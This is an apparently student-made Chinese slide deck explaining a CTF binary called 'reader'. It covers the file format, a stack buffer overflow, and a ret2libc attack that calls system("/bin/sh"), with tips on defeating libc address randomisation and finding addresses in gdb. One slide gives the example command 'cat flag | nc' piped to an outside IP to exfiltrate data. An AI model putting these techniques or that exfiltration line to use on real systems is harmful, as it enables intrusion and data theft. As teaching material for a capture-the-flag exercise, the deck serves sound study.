--author Slipper
--huge reader
--date today
--withborder
这是一份粗制滥造的ppt

大牛轻喷

如有错误，请立刻指出！

有疑惑请立刻找找kelwin、zTrix等人交流。。


--newpage
--withborder
reader的功能是把读入文本文件，按照一定样式输出。


输入文件格式：*.sec

前12个字符必须是"\xffSECUINSIDE\x00"

接下来会分两次读入50个字符（用a, b表示）

接下来是"\ff\ff\ff\ff"

然后读入3个整数（分别设为x, y, z）和额外一个字节w。

最后分别开x, y, z的空间，再分别读入x, y, z大小的数据。

要求：
	4 <= x < 0x32
	y <= 0x32
	z <= 0x64
	w != 0

--newpage

--withborder

unsigned int __cdecl sub_80487F3(int a1, int a2, unsigned int a3)
{
  unsigned int result; // eax@3
  unsigned int i; // [sp+Ch] [bp-4h]@1

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(_BYTE *)(i + a1) = *(_BYTE *)(a2 + i);
  }
  return result;
}

这样的操作很容易出问题。

在调用这个函数的时候也没有正确地处理数据长度。

--newpage
--withborder

程序中有一个地方是把y开始的长度为strlen(b)的数据复制到栈上

strlen(b) <= 50

如果y自身的长度很短，那么后面接着的就是z的数据。

复制50bytes数据完全可以覆盖到后面的数据了。

--newpage
--withborder

--title 攻击手段

现在的程序基本上都把栈设置成了不可执行。

直接在栈上面布shellcode是无效的。

我们只能在可执行段找地方执行。

--newpage
--withborder

--title ret2libc

几乎所有的程序都会加载libc这个库。

如果我们能控制栈上的参数，然后调用这个库上的函数，就能做很多事。

比如system("/bin/sh"), system("cat flag | nc 123.45.67.89 8080")....

--newpage
--withborder

--title ret2libc的原理

栈的结构

esp | .......y.z..... | ret | ebp | ...........

覆盖后

esp | .......dddd|ddd |addr1|addr2| str | .....

覆盖了返回地址之后，程序会直接跳到addr1的地方执行。（不会把返回地址压栈）

这时候esp是无意义的ddd，而ebp指向addr2。

在addr1处的代码，会先push %ebp, mov %esp, %ebp，再把ebp作为传入参数的地址。而现在ebp指向正常的栈。

因为通常使用的时候都是call addr1，会把返回的地址先压到栈中，所以实际上在函数addr1中，引用参数的地址是ebp+4，也就是str所在的地方。

--newpage
--withborder

我们现在要做的，就是

把addr1填成system在libc中的地址，再找到一个合适的命令（"/bin/sh"）的指针放在str的位置。

这样就能调用system("/bin/sh")了。

--newpage
--withborder

--huge ORZ

好吧我能讲的都已经被讲了。。

怎么找system地址？

首先要关掉libc的地址随机化。

可以用ulimit -s unlimited这个命令，把栈空间最大化。（因为只要共享库用随机地址，栈空间就会有浪费）

这样以来libc的地址就固定了。

现在可以在gdb中用print system这个命令。

因为libc中有的函数用到了"/bin/sh"这个字符串，所以在libc中也可以找到这个字符串的指针。


--newpage
--withborder

基本上就这么多了。

--newpage
--withborder

还有一点。。

如果/bin/sh是指向/bin/bash，是没有提权效果的。

因为bash好像会自动去掉euid，这样权限只能是原用户的权限。

不过现在ubuntu默认的/bin/sh指向的是/bin/dash，暂时没有这个问题。
